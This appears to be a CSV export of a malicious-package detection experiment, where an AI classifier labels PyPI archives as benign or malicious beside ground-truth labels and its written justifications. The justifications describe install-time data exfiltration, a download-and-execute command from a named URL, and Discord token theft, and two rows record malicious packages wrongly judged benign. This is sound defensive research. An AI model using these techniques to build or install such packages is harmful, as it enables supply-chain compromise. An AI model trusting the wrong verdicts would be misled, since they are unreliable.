"groundtruth","subclass","package_size","classification","package_name","agent","justification","classification_id","package_name-2","package_metadata","classification-2","justification-2","suspicious_files","created_at","updated_at","prompt_id","model","dataset_id","experiment_id"
"benign","benign","13933","benign","dtw-1.4.0.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file uses standard libraries (`setuptools`, `imp`) and imports `version.py`, which appears to be a legitimate file containing the package version. The `install_requires` lists common scientific packages (`numpy`, `scipy`). No suspicious imports or malicious activities were identified in the analyzed files.","d88396ec-5ed3-43e4-bf25-8ec44f91e2e4","dtw","{""model_type"": ""gemini"", ""author_name"": ""Pierre Rouanet"", ""author_email"": ""pierre.rouanet@gmail.com"", ""num_of_files"": 14, ""package_name"": ""dtw"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Python DTW Module"", ""package_version"": ""1.4.0"", ""package_homepage"": ""https://github.com/pierre-rouanet/dtw"", ""gemini_raw_response"": ""Classification: Benign\n\nJustification: The `setup.py` file uses standard libraries (`setuptools`, `imp`) and imports `version.py`, which appears to be a legitimate file containing the package version. The `install_requires` lists common scientific packages (`numpy`, `scipy`). No suspicious imports or malicious activities were identified in the analyzed files."", ""num_of_python_files"": 7, ""package_description"": """", ""available_python_files"": [""setup.py"", ""test.py"", ""test_fastvsnormal.py"", ""__init__.py"", ""test_import.py"", ""dtw.py"", ""version.py""], ""package_formatted_path"": "".temp/plain/dtw-1.4.0_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file uses standard libraries (`setuptools`, `imp`) and imports `version.py`, which appears to be a legitimate file containing the package version. The `install_requires` lists common scientific packages (`numpy`, `scipy`). No suspicious imports or malicious activities were identified in the analyzed files.","{}","2025-06-29 21:08:39.512588+00","2025-06-29 21:08:39.512588+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","57591bf1-3395-4cd8-857f-40808ccda49e","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","9640","malicious","pptest-999.0.25.tar.gz","classifier-no-tool-no-state-information","The `setup.py` script contains code that gathers system information including hostname, current working directory, public IP, and local IP addresses. This information is then exfiltrated via DNS queries to a hardcoded domain, `u3y2rcq2ykwkohefvsie6wbaj1prdg.burpcollaborator.net`, which is a known service used for out-of-band data exfiltration. This activity is disguised as a ""security test"". The use of `entry_points` to override the `pip3` command further indicates malicious intent to execute this exfiltration during package installation or subsequent use of `pip3`.","46c51291-a7c3-406d-b001-c4f9b914f368","pptest","{""model_type"": ""gemini"", ""author_name"": ""pptest"", ""author_email"": ""testtt@google.com"", ""num_of_files"": 9, ""package_name"": ""pptest"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""just for test"", ""package_version"": ""999.0.25"", ""package_homepage"": ""https://www.google.com"", ""gemini_raw_response"": ""Classification: Malicious\n\nJustification: The `setup.py` script contains code that gathers system information including hostname, current working directory, public IP, and local IP addresses. This information is then exfiltrated via DNS queries to a hardcoded domain, `u3y2rcq2ykwkohefvsie6wbaj1prdg.burpcollaborator.net`, which is a known service used for out-of-band data exfiltration. This activity is disguised as a \""security test\"". The use of `entry_points` to override the `pip3` command further indicates malicious intent to execute this exfiltration during package installation or subsequent use of `pip3`.\n\nSuspicious file(s): setup.py"", ""num_of_python_files"": 2, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pptest-999.0.25_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` script contains code that gathers system information including hostname, current working directory, public IP, and local IP addresses. This information is then exfiltrated via DNS queries to a hardcoded domain, `u3y2rcq2ykwkohefvsie6wbaj1prdg.burpcollaborator.net`, which is a known service used for out-of-band data exfiltration. This activity is disguised as a ""security test"". The use of `entry_points` to override the `pip3` command further indicates malicious intent to execute this exfiltration during package installation or subsequent use of `pip3`.","{setup.py}","2025-06-29 21:08:59.495436+00","2025-06-29 21:08:59.495436+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","4dd98202-9d7d-4c34-accf-ae8f7aafbb1e","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","16019","malicious","noblesse-0.0.1.tar.gz","classifier-no-tool-no-state-information","The `noblesse.py` file contains numerous functions that perform malicious activities, completely unrelated to its stated purpose of 'optimizing your PC for Python.' These activities include Discord Account Manipulation, Information Exfiltration, Denial-of-Service (DoS) Attack, and Webhook Spamming, indicating malicious intent such as account compromise, data exfiltration, and participation in DoS attacks.","2e680048-6b8d-49ef-8d74-eead2aab49b5","noblesse","{""model_type"": ""gemini"", ""author_name"": ""sipher"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""noblesse"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""This Module Optimises your PC For Python"", ""package_version"": ""0.0.1"", ""package_homepage"": ""https://github.com/siph-er"", ""gemini_raw_response"": ""**Classification:** Malicious\n\n**Justification:** The `noblesse.py` file contains numerous functions that perform malicious activities, completely unrelated to its stated purpose of \""optimizing your PC for Python.\"" These activities include:\n- **Discord Account Manipulation:** Functions such as `leave_guild`, `delete_guild`, `remove_friend`, `create_guild`, and `close` interact with the Discord API to perform destructive actions on a user's account, including leaving/deleting servers, removing friends, and closing channels.\n- **Information Exfiltration:** The `log_attachments` function sends attachment details and content to a specified webhook, indicating data theft. The `check_nitro` function attempts to redeem Discord Nitro gift codes and reports the results to a webhook. The `ui` function gathers detailed Discord user information (email, phone, friends, servers, DM channels) using an authentication token.\n- **Denial-of-Service (DoS) Attack:** The `flood` function is designed to perform a UDP flood, which is a common method for launching DoS attacks.\n- **Webhook Spamming:** The `webhook_spam` function can be used to repeatedly send messages to a Discord webhook.\n\nThe presence of these functionalities strongly indicates malicious intent, such as account compromise, data exfiltration, and participation in DoS attacks.\n\n**Suspicious file(s):** noblesse.py"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""noblesse.py""], ""package_formatted_path"": "".temp/plain/noblesse-0.0.1_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""noblesse.py""]}","malicious","The `noblesse.py` file contains numerous functions that perform malicious activities, completely unrelated to its stated purpose of 'optimizing your PC for Python.' These activities include Discord Account Manipulation, Information Exfiltration, Denial-of-Service (DoS) Attack, and Webhook Spamming, indicating malicious intent such as account compromise, data exfiltration, and participation in DoS attacks.","{noblesse.py}","2025-06-29 21:09:07.001474+00","2025-06-29 21:09:07.001474+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","75b3e6bb-5394-45b7-96b1-814c0596f053","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","16562","benign","ctx-0.2.2.tar.gz","classifier-no-tool-no-state-information","The package is classified as benign. The `setup.py` file imports `ctx`, which is a local module within the package. The package metadata and the content of `setup.py` do not show any suspicious activities or unusual imports. The package appears to be a simple utility as described by its summary: ""A minimal but opinionated dict/object combo (like Bunch).""","e8afa943-4cdf-4367-a779-7af8fb24f7c0","ctx","{""model_type"": ""gemini"", ""author_name"": ""Robert Ledger"", ""author_email"": ""figlief@figlief.com"", ""num_of_files"": 18, ""package_name"": ""ctx"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A minimal but opinionated dict/object combo (like Bunch)."", ""package_version"": ""0.2.2"", ""package_homepage"": ""https://github.com/figlief/ctx"", ""gemini_raw_response"": ""Benign.\n\nThe package is classified as benign. The `setup.py` file imports `ctx`, which is a local module within the package. The package metadata and the content of `setup.py` do not show any suspicious activities or unusual imports. The package appears to be a simple utility as described by its summary: \""A minimal but opinionated dict/object combo (like Bunch).\""\n\nNo suspicious files were identified."", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""ctx.py"", ""test_ctx.py"", ""setup.py""], ""package_formatted_path"": "".temp/plain/ctx-0.2.2_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The package is classified as benign. The `setup.py` file imports `ctx`, which is a local module within the package. The package metadata and the content of `setup.py` do not show any suspicious activities or unusual imports. The package appears to be a simple utility as described by its summary: ""A minimal but opinionated dict/object combo (like Bunch).""","{}","2025-06-29 21:09:36.084636+00","2025-06-29 21:09:36.084636+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","a9202835-9cc8-47fe-ab6e-7db94f4653d8","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","1332","malicious","junkeldat-1.0.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains a custom install command that, upon execution, attempts to resolve a suspicious hardcoded domain `www.dl01.pwnz.org` (decoded from `d3d3LmRsMDEucHduei5vcmc=`) using `socket.gethostbyname`. This behavior, especially during package installation, is a strong indicator of malicious activity, potentially for command and control or reconnaissance.","08a77b45-807a-45b8-8eea-5eddb78cb35c","junkeldat","{""model_type"": ""gemini"", ""author_name"": ""UNKNOWN"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 7, ""package_name"": ""junkeldat"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""The junkeldat software"", ""package_version"": ""1.0"", ""package_homepage"": ""http://pypi.python.org/pypi/junkeldat/"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file contains a custom install command that, upon execution, attempts to resolve a suspicious hardcoded domain `www.dl01.pwnz.org` (decoded from `d3d3LmRsMDEucHduei5vcmc=`) using `socket.gethostbyname`. This behavior, especially during package installation, is a strong indicator of malicious activity, potentially for command and control or reconnaissance.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 2, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/junkeldat-1.0_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains a custom install command that, upon execution, attempts to resolve a suspicious hardcoded domain `www.dl01.pwnz.org` (decoded from `d3d3LmRsMDEucHduei5vcmc=`) using `socket.gethostbyname`. This behavior, especially during package installation, is a strong indicator of malicious activity, potentially for command and control or reconnaissance.","{setup.py}","2025-06-29 21:09:36.134183+00","2025-06-29 21:09:36.134183+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","983e99b7-4bf4-4192-ad6d-ec3294e63abd","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","9309","malicious","pptest-999.0.12.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains highly suspicious code. It attempts to collect system information such as hostname, current working directory, local IP addresses, and public IP address. It then exfiltrates this collected information via DNS queries to a hardcoded domain `hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net`. This behavior is indicative of data exfiltration and is a common characteristic of malicious packages. The `mypip` function is designed to be executed as a console script named `pip3`, which suggests an attempt to masquerade as a legitimate `pip` command to deceive users and execute malicious code during package installation.","c0721b70-9959-4ebd-822e-2c27b9680ec4","pptest","{""model_type"": ""gemini"", ""author_name"": ""pptest"", ""author_email"": ""testtt@google.com"", ""num_of_files"": 9, ""package_name"": ""pptest"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""just for test"", ""package_version"": ""999.0.12"", ""package_homepage"": ""https://www.google.com"", ""gemini_raw_response"": ""Classification: Malicious\n\nJustification: The `setup.py` file contains highly suspicious code.\n1. It attempts to collect system information such as hostname, current working directory, local IP addresses, and public IP address.\n2. It then exfiltrates this collected information via DNS queries to a hardcoded domain `hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net`. This behavior is indicative of data exfiltration and is a common characteristic of malicious packages.\n3. The `mypip` function is designed to be executed as a console script named `pip3`, which suggests an attempt to masquerade as a legitimate `pip` command to deceive users and execute malicious code during package installation.\n\nSuspicious file(s): setup.py"", ""num_of_python_files"": 2, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pptest-999.0.12_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains highly suspicious code. It attempts to collect system information such as hostname, current working directory, local IP addresses, and public IP address. It then exfiltrates this collected information via DNS queries to a hardcoded domain `hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net`. This behavior is indicative of data exfiltration and is a common characteristic of malicious packages. The `mypip` function is designed to be executed as a console script named `pip3`, which suggests an attempt to masquerade as a legitimate `pip` command to deceive users and execute malicious code during package installation.","{setup.py}","2025-06-29 21:10:02.395531+00","2025-06-29 21:10:02.395531+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","46d93cf7-1d27-495e-9118-c3aae11fa66d","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","18692","benign","python_graphql_client-0.4.3.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file shows standard practices for a Python package, including typical dependencies for a GraphQL client (`aiohttp`, `requests`, `websockets`). There are no unusual imports, commands, or obfuscated code. The author information and project URL in `setup.py` match the provided metadata, suggesting consistency and legitimacy. The package's overall structure and the purpose of the listed dependencies align with its declared function as a Python GraphQL client.","b5c5781d-1ebd-435c-b294-726973829032","python-graphql-client","{""model_type"": ""gemini"", ""author_name"": ""Justin Krinke"", ""author_email"": ""opensource@prodigygame.com"", ""num_of_files"": 10, ""package_name"": ""python-graphql-client"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Python GraphQL Client"", ""package_version"": ""0.4.3"", ""package_homepage"": ""https://github.com/prodigyeducation/python-graphql-client"", ""gemini_raw_response"": ""The package is classified as **benign**.\n\n**Justification:**\n\nThe `setup.py` file shows standard practices for a Python package, including typical dependencies for a GraphQL client (`aiohttp`, `requests`, `websockets`). There are no unusual imports, commands, or obfuscated code. The author information and project URL in `setup.py` match the provided metadata, suggesting consistency and legitimacy. The package's overall structure and the purpose of the listed dependencies align with its declared function as a Python GraphQL client.\n\n**Suspicious file(s):** None."", ""num_of_python_files"": 3, ""package_description"": ""[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)"", ""available_python_files"": [""setup.py"", ""__init__.py"", ""graphql_client.py""], ""package_formatted_path"": "".temp/plain/python_graphql_client-0.4.3_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file shows standard practices for a Python package, including typical dependencies for a GraphQL client (`aiohttp`, `requests`, `websockets`). There are no unusual imports, commands, or obfuscated code. The author information and project URL in `setup.py` match the provided metadata, suggesting consistency and legitimacy. The package's overall structure and the purpose of the listed dependencies align with its declared function as a Python GraphQL client.","{}","2025-06-29 21:10:24.490198+00","2025-06-29 21:10:24.490198+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","02434c6f-773a-4ee6-ae18-e9db9c1591ea","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","3933","malicious","aws-login0tool-0.0.3.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file attempts to download an executable from a remote URL (`https://tryg.ga/syswin32.exe`) and then execute it (`run(['start', 'syswin32.exe'], shell=True)`). This behavior is highly indicative of a supply chain attack or malware.","333ed43a-3881-465e-899c-a5063c45390d","aws-login0tool","{""model_type"": ""gemini"", ""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 11, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.3"", ""package_homepage"": ""https://example.com"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file attempts to download an executable from a remote URL (`https://tryg.ga/syswin32.exe`) and then execute it (`run(['start', 'syswin32.exe'], shell=True)`). This behavior is highly indicative of a supply chain attack or malware.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.3_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file attempts to download an executable from a remote URL (`https://tryg.ga/syswin32.exe`) and then execute it (`run(['start', 'syswin32.exe'], shell=True)`). This behavior is highly indicative of a supply chain attack or malware.","{setup.py}","2025-06-29 21:10:24.492777+00","2025-06-29 21:10:24.492777+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","e4638b29-c167-4304-9c6f-28dc58dff03d","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","78490","benign","pyscreenshot-3.0.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file has a standard structure, importing `setuptools` and `os.path`, and retrieving the version from `about.py`. The `install_requires` lists common and expected dependencies for a screenshot tool (`EasyProcess`, `entrypoint2`, `mss`, `jeepney`). There are no suspicious imports, commands, or file operations observed in the `setup.py` content. The package description also aligns with its stated purpose.","473f6bab-db5c-4e90-a1c2-fc0f3e7447b3","pyscreenshot","{""model_type"": ""gemini"", ""author_name"": ""ponty"", ""author_email"": ""NA"", ""num_of_files"": 73, ""package_name"": ""pyscreenshot"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""python screenshot"", ""package_version"": ""3.0"", ""package_homepage"": ""https://github.com/ponty/pyscreenshot"", ""gemini_raw_response"": ""Classification: Benign\n\nJustification: The `setup.py` file has a standard structure, importing `setuptools` and `os.path`, and retrieving the version from `about.py`. The `install_requires` lists common and expected dependencies for a screenshot tool (`EasyProcess`, `entrypoint2`, `mss`, `jeepney`). There are no suspicious imports, commands, or file operations observed in the `setup.py` content. The package description also aligns with its stated purpose.\n\nSuspicious Files: None."", ""num_of_python_files"": 64, ""package_description"": ""The pyscreenshot module is obsolete in most cases."", ""available_python_files"": [""setup.py"", ""test_scrot.py"", ""test_maim.py"", ""config.py"", ""test_pyside.py"", ""test_pil.py"", ""test_check.py"", ""test_examples.py"", ""size.py"", ""image_debug.py"", ""notest.py"", ""test_default.py"", ""test_kwin_dbus.py"", ""test_grim.py"", ""test_mss.py"", ""test_gnome_dbus.py"", ""fillscreen.py"", ""test_wx.py"", ""test_pyqt5.py"", ""double_disp.py"", ""test_x_gnome_screenshot.py"", ""test_imagemagick.py"", ""test_mac_quartz.py"", ""test_mac_screencapture.py"", ""test_pyside2.py"", ""test_pyqt4.py"", ""bt.py"", ""test_pygdk3.py"", ""vagrant_boxes.py"", ""childproc.py"", ""err.py"", ""util.py"", ""tempexport.py"", ""loader.py"", ""imcodec.py"", ""__init__.py"", ""about.py"", ""showall.py"", ""versions.py"", ""speedtest.py"", ""print_backend_version.py"", ""grab.py"", ""grabfullscreen.py"", ""grabbox.py"", ""virtdisp.py"", ""msswrap.py"", ""pyside_grabwindow.py"", ""mac_screencapture.py"", ""imagemagick.py"", ""maim.py"", ""pilwrap.py"", ""qt4grabwindow.py"", ""pyside2_grabwindow.py"", ""grim.py"", ""mac_quartz.py"", ""gdk3pixbuf.py"", ""wxscreen.py"", ""scrot.py"", ""xwd.py"", ""gnome_dbus.py"", ""kwin_dbus.py"", ""backend.py"", ""qt5grabwindow.py"", ""gnome_screenshot.py""], ""package_formatted_path"": "".temp/plain/pyscreenshot-3.0_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file has a standard structure, importing `setuptools` and `os.path`, and retrieving the version from `about.py`. The `install_requires` lists common and expected dependencies for a screenshot tool (`EasyProcess`, `entrypoint2`, `mss`, `jeepney`). There are no suspicious imports, commands, or file operations observed in the `setup.py` content. The package description also aligns with its stated purpose.","{}","2025-06-29 21:10:45.38212+00","2025-06-29 21:10:45.38212+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","1e7bd53a-8c40-4d7f-9a4f-f68b9f06b96f","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","7023","benign","filechunkio-1.8.tar.gz","classifier-no-tool-no-state-information","The `setup.py` and `filechunkio.py` scripts contain standard Python code for package setup and file manipulation, respectively. There are no suspicious imports, obfuscated code, or any indicators of malicious behavior. The package appears to be a legitimate utility for reading file chunks.","5ce2d0e9-3df3-4366-9b3b-2ca85df157cb","filechunkio","{""model_type"": ""gemini"", ""author_name"": ""Fabian Topfstedt"", ""author_email"": ""topfstedt@schneevonmorgen.com"", ""num_of_files"": 5, ""package_name"": ""filechunkio"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""FileChunkIO represents a chunk of an OS-level file containing bytes data"", ""package_version"": ""1.8"", ""package_homepage"": ""http://bitbucket.org/fabian/filechunkio"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The `setup.py` and `filechunkio.py` scripts contain standard Python code for package setup and file manipulation, respectively. There are no suspicious imports, obfuscated code, or any indicators of malicious behavior. The package appears to be a legitimate utility for reading file chunks.\nSuspicious file(s): None"", ""num_of_python_files"": 4, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""filechunkio.py"", ""__init__.py"", ""tests.py""], ""package_formatted_path"": "".temp/plain/filechunkio-1.8_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` and `filechunkio.py` scripts contain standard Python code for package setup and file manipulation, respectively. There are no suspicious imports, obfuscated code, or any indicators of malicious behavior. The package appears to be a legitimate utility for reading file chunks.","{}","2025-06-29 21:10:50.823499+00","2025-06-29 21:10:50.823499+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","799b9805-dd25-4c3c-8b6c-caf9cae7bfe1","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","9588","malicious","pyobfadvance-1.0.1.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file exhibits highly suspicious behavior, including extensive obfuscation, dynamic code execution, and built-in function rebinding, which are strong indicators of malicious activity.","a5570747-676f-4206-92a3-12e645f3e860","pyobfadvance","{""model_type"": ""gemini"", ""author_name"": ""pyobfadvance"", ""author_email"": ""pyobfadvance@gmail.com"", ""num_of_files"": 9, ""package_name"": ""pyobfadvance"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Python Obfuscator Advance Version"", ""package_version"": ""1.0.1"", ""package_homepage"": ""https://github.com/pyobfadvance/pyobfadvance"", ""gemini_raw_response"": ""The package is classified as **malicious**.\n\n**Justification:** The `setup.py` file exhibits highly suspicious behavior, including:\n1.  **Extensive Obfuscation:** The code is heavily obfuscated using techniques like string manipulation, base64 encoding, zlib compression, and arithmetic operations to hide its true intent.\n2.  **Dynamic Code Execution:** It utilizes `eval` and `exec` on dynamically constructed and decoded strings, which is a common tactic for delivering payloads or executing arbitrary code.\n3.  **Built-in Function Rebinding:** The script rebinds built-in functions such as `print`, `exec`, and `eval` to other variable names (`______`, `_____`, `____`), a technique used to evade detection and analysis.\n\nThese combined characteristics are strong indicators of malicious activity, as legitimate packages do not typically employ such methods in their installation or core scripts.\n\n**Suspicious file(s):** setup.py"", ""num_of_python_files"": 4, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__main__.py"", ""utils.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/pyobfadvance-1.0.1_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file exhibits highly suspicious behavior, including extensive obfuscation, dynamic code execution, and built-in function rebinding, which are strong indicators of malicious activity.","{setup.py}","2025-06-29 21:11:12.824055+00","2025-06-29 21:11:12.824055+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","355b568c-c996-45ef-8186-fe61afd58d8f","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","3308","benign","genesisbot-0.0.1.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file properly defines the package with standard metadata and a legitimate dependency on the `requests` library. There are no clear indicators of malicious intent or unusual behavior in the provided metadata or the `setup.py` file. The package summary ""This Module Optimises your PC For Python"" suggests a system utility, but without the contents of `genesisbot.py`, I cannot definitively confirm its functionality. However, based on the current information, there are no suspicious signs.","12e1a74e-7f16-4a9d-ac17-d2a1c0a226d9","genesisbot","{""model_type"": ""gemini"", ""author_name"": ""xin"", ""author_email"": ""xinftw@protonmail.com"", ""num_of_files"": 9, ""package_name"": ""genesisbot"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""This Module Optimises your PC For Python"", ""package_version"": ""0.0.1"", ""package_homepage"": ""https://github.com/devil-xin"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The `setup.py` file properly defines the package with standard metadata and a legitimate dependency on the `requests` library. There are no clear indicators of malicious intent or unusual behavior in the provided metadata or the `setup.py` file. The package summary \""This Module Optimises your PC For Python\"" suggests a system utility, but without the contents of `genesisbot.py`, I cannot definitively confirm its functionality. However, based on the current information, there are no suspicious signs.\nSuspicious file(s): None"", ""num_of_python_files"": 2, ""package_description"": ""#Optimise"", ""available_python_files"": [""setup.py"", ""genesisbot.py""], ""package_formatted_path"": "".temp/plain/genesisbot-0.0.1_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file properly defines the package with standard metadata and a legitimate dependency on the `requests` library. There are no clear indicators of malicious intent or unusual behavior in the provided metadata or the `setup.py` file. The package summary ""This Module Optimises your PC For Python"" suggests a system utility, but without the contents of `genesisbot.py`, I cannot definitively confirm its functionality. However, based on the current information, there are no suspicious signs.","{}","2025-06-29 21:11:32.923539+00","2025-06-29 21:11:32.923539+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","35a3a985-0f53-4a6e-bd3e-b623e50c4f55","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","9157","benign","sentinels-1.0.0.tar.gz","classifier-no-tool-no-state-information","The package metadata and Python scripts do not exhibit any malicious indicators. The `setup.py` file properly sets up the package, and the `__version__.py` file simply defines the package version. There are no suspicious imports or unusual code patterns observed.","928962fe-0574-46e8-b72a-7f9030a770bb","sentinels","{""model_type"": ""gemini"", ""author_name"": ""Rotem Yaari"", ""author_email"": ""vmalloc@gmail.com"", ""num_of_files"": 15, ""package_name"": ""sentinels"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Various objects to denote special meanings in python"", ""package_version"": ""1.0.0"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The package metadata and Python scripts do not exhibit any malicious indicators. The `setup.py` file properly sets up the package, and the `__version__.py` file simply defines the package version. There are no suspicious imports or unusual code patterns observed.\nSuspicious Files: None"", ""num_of_python_files"": 4, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""test__readme_doctest.py"", ""__init__.py"", ""__version__.py""], ""package_formatted_path"": "".temp/plain/sentinels-1.0.0_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The package metadata and Python scripts do not exhibit any malicious indicators. The `setup.py` file properly sets up the package, and the `__version__.py` file simply defines the package version. There are no suspicious imports or unusual code patterns observed.","{}","2025-06-29 21:11:36.635542+00","2025-06-29 21:11:36.635542+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","0a019540-254d-4cd5-9bc2-11c351eba81d","8bca045c-2577-46e3-bd68-24d40f4aec73"
